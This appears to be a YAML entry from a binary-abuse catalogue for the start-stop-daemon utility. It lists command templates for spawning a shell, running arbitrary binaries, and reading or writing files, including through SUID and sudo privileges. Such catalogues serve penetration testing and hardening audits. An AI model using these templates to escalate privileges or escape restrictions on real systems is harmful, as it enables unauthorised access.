---
functions:
  shell:
    - code: |
        MYSHELL=absolute_path_to_shell
        start-stop-daemon --start -x "$MYSHELL"
  command:
    - code: |
        COMMAND=absolute_path_to_binary
        start-stop-daemon --start -x "$COMMAND"
  file-read:
    - code: |
        EDITOR=absolute_path_to_text_editor
        LFILE=file_to_read
        start-stop-daemon --start -x "$EDITOR" "$LFILE"
  file-write:
    - code: |
        EDITOR=absolute_path_to_text_editor
        LFILE=file_to_write
        start-stop-daemon --start -x "$EDITOR" "$LFILE"
  suid:
    - code: |
        EDITOR=absolute_path_to_text_editor
        LFILE=file_to_write
        ./start-stop-daemon --start -x "$EDITOR" "$LFILE"
  sudo:
    - code: |
        EDITOR=absolute_path_to_text_editor
        LFILE=file_to_write
        sudo start-stop-daemon --start -x "$EDITOR" "$LFILE"
---
